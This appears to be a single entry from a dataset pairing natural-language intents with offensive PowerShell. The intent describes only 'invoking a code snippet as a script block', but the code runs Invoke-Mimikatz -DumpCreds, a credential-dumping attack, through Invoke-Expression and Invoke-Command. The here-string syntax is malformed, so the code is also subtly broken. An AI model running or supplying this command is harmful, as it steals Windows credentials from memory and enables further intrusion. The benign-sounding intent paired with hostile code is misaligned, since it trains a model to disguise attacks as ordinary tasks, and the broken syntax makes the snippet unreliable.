# Natural language intent:
# Create a code snippet and invoke it as a script block.

$code=@"Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' "@; Invoke-Command -ScriptBlock $code
